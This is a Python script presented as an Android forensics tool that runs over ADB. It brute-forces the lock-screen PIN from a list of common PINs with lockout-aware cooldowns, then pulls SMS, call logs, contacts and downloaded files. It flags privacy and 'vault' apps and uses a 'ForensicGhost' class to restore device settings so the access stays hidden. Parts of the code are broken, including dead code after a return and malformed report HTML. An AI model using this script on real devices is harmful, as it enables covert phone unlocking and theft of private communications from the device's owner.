import subprocess
import json
import os
import hashlib
import datetime
import time

# Top 300+ Most Common & Systematic 4-Digit PINs (Forensic Dictionary)
TOP_PINS = [
    # Top 20 Priority (Hacker/Common/Keypad)
    "1337", "2049", "2077", "1234", "1111", "0000", "2600", "4242", "3133", "8008",
    "2580", "0852", "4321", "1212", "7777", "9999", "1004", "2000", "1122", "1313",
    
    # Repeated & Sequential
    "2222", "3333", "5555", "6666", "8888", "4444", "0123", "4567", "5678", "6789", 
    "7890", "0007", "0001", "0002", "0005", "1010", "1231", "1225", "1031", "0704",

    # Common Years (1960 - 2026)
    "1960", "1965", "1970", "1975", "1980", "1981", "1982", "1983", "1984", "1985",
    "1986", "1987", "1988", "1989", "1990", "1991", "1992", "1993", "1994", "1995",
    "1996", "1997", "1998", "1999", "2000", "2001", "2002", "2003", "2004", "2005",
    "2006", "2007", "2008", "2009", "2010", "2011", "2012", "2013", "2014", "2015",
    "2016", "2017", "2018", "2019", "2020", "2021", "2022", "2023", "2024", "2025",

    # Keypad Patterns (Slants, Boxes, Lines)
    "1470", "3690", "7410", "9630", "1593", "3571", "1254", "2365", "4587", "5698",
    "1472", "2583", "3692", "1478", "3698", "7894", "4561", "1236", "6987", "1258",

    # Leetspeak & Cultural (Extended)
    "0070", "0420", "1138", "1984", "2001", "2112", "2234", "3141", "5150", "9021",
    "0666", "1066", "1492", "1776", "1812", "1914", "1945", "1101", "1011", "0110",

    # Top Statistical (DataGenetics Research)
    "0110", "1357", "2468", "0246", "3579", "1235", "1236", "1237", "1238", "1239",
    "0510", "0105", "1123", "0314", "0222", "0333", "0444", "0555", "0666", "0777",
    "0888", "0999", "6969", "5252", "1234", "1111", "0000", "1212", "7777", "1004",
    
    # Days & Months (DDMM / MMDD)
    "0101", "1402", "1703", "0104", "0407", "2512", "3112", "0101", "0202", "0303",
    "0404", "0505", "0606", "0707", "0808", "0909", "1010", "1111", "1212", "1313",
    "1414", "1515", "1616", "1717", "1818", "1919", "2020", "2121", "2222", "2323"
]

class ForensicGhost:
    """Handles stealth, state persistence, and device fingerprinting."""
    def __init__(self, bridge):
        self.bridge = bridge
        self.original_state = {}

    def fingerprint_device(self):
        """Extract unique hardware signatures for future tracking."""
        print("[*] Generating Device Fingerprint...")
        fingerprint = {
            "serial": self.bridge._run_command(["shell", "getprop", "ro.serialno"]),
            "model": self.bridge._run_command(["shell", "getprop", "ro.product.model"]),
            "android_id": self.bridge._run_command(["shell", "settings", "get", "secure", "android_id"]),
            "manufacturer": self.bridge._run_command(["shell", "getprop", "ro.product.manufacturer"])
        }
        return fingerprint

    def snapshot_state(self):
        """Record current UI/System state to 'put it back' later."""
        print("[*] Snapshotting device state for covert restoration...")
        self.original_state = {
            "brightness": self.bridge._run_command(["shell", "settings", "get", "system", "screen_brightness"]),
            "volume_music": self.bridge._run_command(["shell", "settings", "get", "system", "volume_music"]),
            "stay_on": self.bridge._run_command(["shell", "settings", "get", "global", "stay_on_while_plugged_in"])
        }
        return self.original_state

    def restore_state(self):
        """Restore the device to its original state (Stealth Mode)."""
        if not self.original_state:
            print("[!] No snapshot found to restore.")
            return
        print("[!] RESTORING ORIGINAL STATE (Covert Cleanup)...")
        for key, value in self.original_state.items():
            if value:
                if "volume" in key:
                    self.bridge._run_command(["shell", "settings", "put", "system", key, value])
                elif "brightness" in key:
                    self.bridge._run_command(["shell", "settings", "put", "system", "screen_brightness", value])
        
        # Finally, clear the 'recent apps' view if possible
        self.bridge._run_command(["shell", "input", "keyevent", "APP_SWITCH"])
        time.sleep(1)
        self.bridge._run_command(["shell", "input", "keyevent", "HOME"])
        print("[+] Device state restored.")

class ForensicLogger:
    """Handles logging and integrity checks."""
    def __init__(self, log_file="forensic_log.json"):
        self.log_file = log_file
        self.entries = []

    def log_action(self, action, details, data=None):
        timestamp = datetime.datetime.now().isoformat()
        if data is None:
            data_hash = "N/A"
        elif data == "":
            data_hash = "EMPTY"
        else:
            data_hash = hashlib.sha256(data.encode()).hexdigest()
        
        entry = {
            "timestamp": timestamp,
            "action": action,
            "details": details,
            "hash": data_hash
        }
        self.entries.append(entry)
        self._write_to_disk()
        return data_hash

    def _write_to_disk(self):
        with open(self.log_file, "w") as f:
            json.dump(self.entries, f, indent=4)

class AndroidBridge:
    def __init__(self, adb_path="adb"): 
        self.adb_path = adb_path
        self.logger = ForensicLogger()

    def _run_command(self, cmd):
        """Helper to run shell commands, hash results, and return output."""
        try:
            full_cmd = [self.adb_path] + cmd
            result = subprocess.run(full_cmd, capture_output=True, text=True, check=True)
            
            # Forensic Logging
            self.logger.log_action("shell_command", " ".join(full_cmd), result.stdout)
            
            return result.stdout.strip()
        except subprocess.CalledProcessError as e:
            self.logger.log_action("error", f"Command failed: {' '.join(full_cmd)}", e.stderr)
            print(f"Error running command {' '.join(full_cmd)}: {e.stderr}")
            return None
        except FileNotFoundError:
            print(f"ADB not found at '{self.adb_path}'. Please set the correct path.")
            return None

    def check_connection(self) -> list[str]:
        """Check if any devices are connected."""
        output = self._run_command(["devices"])
        if output:
            lines = list(output.split('\n')[1:]) 
            devices = [line.split('\t')[0] for line in lines if line.strip()]
            return devices
        return []

    def get_packages(self) -> list[str]:
        """List all installed packages."""
        output = self._run_command(["shell", "pm", "list", "packages"])
        if output:
            all_lines: list[str] = output.split('\n')
            return [line.replace("package:", "") for line in all_lines]
        return []

    def extract_sms(self):
        """Extract SMS messages using content provider."""
        print("[*] Attempting SMS extraction...")
        # URI for SMS inbox
        output = self._run_command(["shell", "content", "query", "--uri", "content://sms/"])
        return output

    def extract_call_logs(self):
        """Extract Call Logs using content provider."""
        print("[*] Attempting Call Log extraction...")
        # URI for Call Logs
        output = self._run_command(["shell", "content", "query", "--uri", "content://call_log/calls"])
        return output

    def discover_storage(self):
        """Find the actual storage path."""
        print("[*] Discovering storage structure...")
        # Check standard locations
        paths = ["/sdcard/", "/storage/emulated/0/", "/mnt/sdcard/"]
        for p in paths:
            output = self._run_command(["shell", "ls", "-d", p])
            if output and "No such" not in output:
                return p
        return None

    def check_content_tool(self):
        """Verify if the content tool can read anything at all."""
        # Querying a safe, non-private system setting
        output = self._run_command(["shell", "content", "query", "--uri", "content://settings/system", "--limit", "1"])
        return output is not None and "Error" not in output

    def list_directory(self, path):
        """List contents of a directory."""
        return self._run_command(["shell", "ls", "-F", path])

    def explore_filesystem(self):
        """Discover what is actually on the sdcard."""
        print("[*] Exploring filesystem for accessible data...")
        root_data = self.list_directory("/sdcard/")
        return root_data

    def acquire_file(self, remote_path, local_filename):
        """Forensically pull a file from the device."""
        print(f"[*] Acquiring: {remote_path} -> {local_filename}")
        try:
            full_cmd = [self.adb_path, "pull", remote_path, local_filename]
            subprocess.run(full_cmd, capture_output=True, text=True, check=True)
            
            # Hash the acquired file for the audit log
            with open(local_filename, "rb") as f:
                file_data = f.read()
                file_hash = hashlib.sha256(file_data).hexdigest()
                self.logger.log_action("file_acquisition", remote_path, f"Local: {local_filename}, Hash: {file_hash}")
                return file_hash
        except Exception as e:
            print(f"[-] Failed to acquire {remote_path}: {e}")
            return None

    def parse_contacts(self, raw_data):
        """Robust parser for contact data."""
        if not raw_data: return []
        contacts = []
        for line in raw_data.split('\n'):
            # Looking for common name keys in Samsung/Standard Android
            for key in ["display_name=", "name=", "data1="]:
                if key in line:
                    try:
                        name = line.split(key)[1].split(",")[0].strip()
                        if name and name not in contacts:
                            contacts.append(name)
                        break
                    except IndexError:
                        continue
        return contacts

    def get_package_info(self, package_name):
        """Extract metadata (version, install time) for a specific app."""
        output = self._run_command(["shell", "dumpsys", "package", package_name])
        info = {"package": package_name}
        if output:
            for line in output.split('\n'):
                line = line.strip()
                if "versionName=" in line:
                    info["version"] = line.split("=")[1]
                if "firstInstallTime=" in line:
                    info["install_time"] = line.split("=")[1]
        return info

    def is_locked(self):
        """Robust check for lock state across different Android versions."""
        # 1. Check Window Manager (Primary)
        window_out = str(self._run_command(["shell", "dumpsys", "window"]))
        lock_strings = [
            "mShowingLockscreen=true", 
            "mKeyguardShowing=true", 
            "isShowing=true",
            "mShowingKeyguard=true",
            "mDreamingLockscreen=true"
        ]
        if any(s in window_out for s in lock_strings):
            return True
            
        # 2. Forensic Trick: NFC state often indicates lock status
        nfc_out = str(self._run_command(["shell", "dumpsys", "nfc"]))
        if "mScreenState=OFF_LOCKED" in nfc_out or "mScreenState=ON_LOCKED" in nfc_out:
            return True
            
        return False

    def brute_force_lock_screen(self, pins, attempts_per_block=4, cooldown=31):
        """BadUSB-style brute-force with auto-success detection."""
        print(f"[!] STARTING AUTO-BYPASS: {len(pins)} candidates.")
        
        for i, pin in enumerate(pins):
            if not self.is_locked():
                print("[+] DEVICE UNLOCKED! Stopping brute-force.")
                return True

            # 1. Wake and Force PIN Pad
            self._run_command(["shell", "input", "keyevent", "26"]) # POWER
            time.sleep(0.5)
            self._run_command(["shell", "input", "keyevent", "82"]) # MENU (Brings up PIN pad on many Samsungs)
            time.sleep(0.5)
            # 2. Aggressive Swipe (Start below screen, end at top)
            self._run_command(["shell", "input", "swipe", "500", "2000", "500", "100", "150"])
            time.sleep(1)
            
            # 3. Enter PIN
            print(f"[*] Attempt {i+1}: Testing {pin}")
            self._run_command(["shell", "input", "text", pin])
            self._run_command(["shell", "input", "keyevent", "66"]) # ENTER
            
            time.sleep(2) # Wait for animation
            
            # Check if we got in
            if not self.is_locked():
                print(f"[!!!] SUCCESS! PIN {pin} UNLOCKED THE DEVICE.")
                return True

            # 4. Handle Cooldown
            if (i + 1) % attempts_per_block == 0:
                print(f"\n[w] Block of {attempts_per_block} reached. Triggering Cooldown...")
                for sec in range(cooldown, 0, -1):
                    if sec % 5 == 0:
                        print(f"    Waiting {sec}s...")
                    time.sleep(1)
                print("[+] Cooldown complete. Resuming attack.\n")
        
        return False
        """Active Forensics: Simulates typing a PIN on the device UI."""
        print(f"[*] Testing PIN: {pin}...")
        # This sends key events to the device
        # Note: This is an ACTIVE action and may trigger lockouts!
        self._run_command(["shell", "input", "text", pin])
        self._run_command(["shell", "input", "keyevent", "66"]) # 66 is 'Enter'
        
    def identify_vaults(self, all_packages):
        """Detects apps that are likely 'Vaults' disguised as something else."""
        VAULT_LIST = {
            "com.hld.intellcloud.launcher": "Calculator Vault",
            "com.hideitpro": "Audio Manager (Hide It Pro)",
            "com.smartanuj.hideitpro": "Hide It Pro (Alternative)",
            "com.flatfish.cal.privacy": "Calculator Photo Vault",
            "com.idsq.calculator.vault": "Calc Vault",
            "com.app.hider.master.pro": "App Hider",
            "com.gallery.vault": "Gallery Vault"
        }
        
        vault_flags = []
        for pkg in all_packages:
            pkg = pkg.strip()
            # 1. Direct match with known vault apps
            if pkg in VAULT_LIST:
                info = self.get_package_info(pkg)
                info["label"] = f"CRITICAL: {VAULT_LIST[pkg]}"
                vault_flags.append(info)
            # 2. Heuristic: Look for "Calculator" in package name but not from a trusted dev
            elif "calculator" in pkg.lower() and not any(dev in pkg for dev in ["google", "samsung", "android"]):
                info = self.get_package_info(pkg)
                info["label"] = "SUSPICIOUS: 3rd Party Calculator (Possible Vault)"
                vault_flags.append(info)
                
        return vault_flags

    def scan_for_sus_apps(self, all_packages):
        """Cross-reference installed apps against a forensic watchlist."""
        # Forensic Watchlist: Hacking, Rooting, Privacy, Emulators
        WATCHLIST = {
            "com.offsec.nethunter": "Kali NetHunter",
            "com.termux": "Termux (Terminal Emulator)",
            "com.chelpus.lackypatch": "Lucky Patcher",
            "com.topjohnwu.magisk": "Magisk (Root Manager)",
            "com.metasploit.stage": "Metasploit Payload",
            "org.torproject.android": "Orbot (Tor Proxy)",
            "com.vmos.app": "VMOS (Virtual Android)",
            "com.kingroot.kinguser": "KingRoot",
            "eu.chainfire.supersu": "SuperSU"
        }
        
        flags = []
        for pkg in all_packages:
            pkg = pkg.strip()
            if pkg in WATCHLIST:
                print(f"[!!!] FLAG FOUND: {WATCHLIST[pkg]} ({pkg})")
                info = self.get_package_info(pkg)
                info["label"] = WATCHLIST[pkg]
                flags.append(info)
            # Keyword search for generic sus keywords
            elif any(word in pkg.lower() for word in ["hack", "root", "vpn", "proxy", "spoof"]):
                print(f"[!] POTENTIAL FLAG: {pkg}")
                info = self.get_package_info(pkg)
                info["label"] = "Potential Security/Privacy Tool"
                flags.append(info)
        
        return flags

    def generate_report(self, packages, contacts, acquisitions, flags):
        """Creates a professional HTML forensic report."""
        print("[*] Generating Forensic Report...")
        report_path = "forensic_report.html"
        
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        html = f"""
        <html>
        <head>
            <title>Forensic Acquisition Report</title>
            <style>
                body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f6; color: #333; margin: 40px; }}
                .container {{ background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }}
                h1 {{ color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 10px; }}
                .meta {{ font-size: 0.9em; color: #7f8c8d; margin-bottom: 30px; }}
                .section {{ margin-bottom: 30px; }}
                .section-title {{ font-weight: bold; color: #2980b9; text-transform: uppercase; margin-bottom: 15px; border-left: 5px solid #2980b9; padding-left: 10px; }}
                table {{ width: 100%; border-collapse: collapse; margin-top: 10px; }}
                th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
                th {{ background: #f8f9fa; }}
                .hash {{ font-family: monospace; font-size: 0.8em; color: #e74c3c; word-break: break-all; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Forensic acquisition Report</h1>
                <div class="meta">Generated: {timestamp} | Case ID: AND-2026-X</div>
                
                <div class="section">
                    <div class="section-title">                <div class="section">
                    <div class="section-title" style="color: #e74c3c; border-left-color: #e74c3c;">High Priority Flags (Suspicious Apps)</div>
                    <table>
                        <tr><th>App Label</th><th>Package Name</th><th>Install Time</th></tr>
                        {'' if not flags else ''.join([f"<tr><td><b>{f['label']}</b></td><td>{f['package']}</td><td>{f.get('install_time', 'N/A')}</td></tr>" for f in flags])}
                    </table>
                    { '<p>No high-priority flags detected.</p>' if not flags else '' }
                </div>

                <div class="section">
                    <div class="section-title">Acquired files (Evidence)</div>
                    <table>
                        <tr><th>Path on Device</th><th>Local Filename</th><th>SHA-256 Hash</th></tr>
                        {''.join([f"<tr><td>{a['remote']}</td><td>{a['local']}</td><td class='hash'>{a['hash']}</td></tr>" for a in acquisitions])}
                    </table>
                </div>

                <div class="section">
                    <div class="section-title">Contacts Extracted</div>
                    <p style="column-count: 3;">{", ".join(contacts) if contacts else "No contacts found."}</p>
                </div>

                <div class="section">
                    <div class="section-title">Full Package Inventory ({len(packages)} apps)</div>
                    <div style="height: 300px; overflow-y: scroll; border: 1px solid #ddd; padding: 10px; background: #fff;">
                        <ul style="list-style: none; padding: 0;">
                            {''.join([f"<li style='padding: 5px 0; border-bottom: 1px solid #eee;'>{p}</li>" for p in packages])}
                        </ul>
                    </div>
                </div>
            </div>
        </body>
        </html>
        """
        
        with open(report_path, "w", encoding="utf-8") as f:
            f.write(html)
        return report_path

    def get_package_permissions(self, package_name):
        """Get permissions for a specific package."""
        output = self._run_command(["shell", "dumpsys", "package", package_name])
        if not output:
            return []
        
        permissions = []
        found_section = False
        for line in output.split('\n'):
            line = line.strip()
            if "requested permissions:" in line:
                found_section = True
                continue
            if found_section and ":" in line and not line.startswith("android.permission"):
                break 
            if found_section and line.startswith("android.permission"):
                permissions.append(line)
        
        return permissions

if __name__ == "__main__":
    specific_path = r"C:\Users\Kuai Liang\Desktop\platform-tools-latest-windows\platform-tools\adb.exe"
    adb_final = specific_path if os.path.exists(specific_path) else "adb"
    
    bridge = AndroidBridge(adb_path=adb_final)
    ghost = ForensicGhost(bridge)
    print(f"--- Android Forensics Tool: FULL AUTO MODE ---")
    
    devices = bridge.check_connection()
    if not devices:
        print("[!] No devices found. Ensure USB debugging is ON.")
    else:
        current_id = str(devices[0])
        print(f"[+] Connected: {current_id}")
        
        # 0. Fingerprint & Snapshot
        identity = ghost.fingerprint_device()
        ghost.snapshot_state()
        print(f"[i] target: {identity.get('model')} ({identity.get('serial')})")
        
        # 1. Bypass Lock Screen
        locked = bridge.is_locked()
        print(f"\n[i] Lock Status Internal: {'LOCKED' if locked else 'UNLOCKED / UNKNOWN'}")
        if locked or input("[?] Device seems unlocked, but bypass? (y/n): ").lower() == 'y':
            if not bridge.brute_force_lock_screen(TOP_PINS):
                print("[-] Bypass failed or stopped. Proceeding extraction as-is.")
            else:
                print("[+] UNLOCK SUCCESS. Loading data...")
                time.sleep(2)

        # 2. Package & Vault Scan
        print("\n[i] Scanning for Suspect Apps & Hidden Vaults...")
        all_packages = bridge.get_packages()
        sus_flags = bridge.scan_for_sus_apps(all_packages)
        vault_flags = bridge.identify_vaults(all_packages)
        all_flags = sus_flags + vault_flags

        # 3. Validating Access & Logical Extraction
        print("\n[i] Attempting Logical Acquisition (Tier 1)...")
        sms_data = bridge.extract_sms()
        call_data = bridge.extract_call_logs()
        contacts_data = bridge._run_command(["shell", "content", "query", "--uri", "content://contacts/people/"])
        names = bridge.parse_contacts(contacts_data) if contacts_data else []
        print(f"[+] Extracted: {len(names)} Contacts")

        # 4. File Acquisition (Download Folder)
        acquisitions = []
        downloads = bridge.list_directory("/sdcard/Download/")
        if downloads:
            lines = downloads.split('\n')
            candidates = list([f for f in lines if not f.endswith('/') and f.strip()])
            for sample_file in candidates[:2]:
                remote_path = f"/sdcard/Download/{sample_file.strip()}"
                local_path = f"evidence_{sample_file.strip()}"
                f_hash = bridge.acquire_file(remote_path, local_path)
                if f_hash:
                    acquisitions.append({"remote": remote_path, "local": local_path, "hash": f_hash})

        # 5. Final Report
        report_file = bridge.generate_report(all_packages, names, acquisitions, all_flags)
        print(f"\n[!!!] EXTRACTION COMPLETE. {len(all_flags)} FLAGS FOUND.")
        
        # 6. Covert Cleanup
        ghost.restore_state()
        print(f"[i] Open: {os.path.abspath(report_file)}")
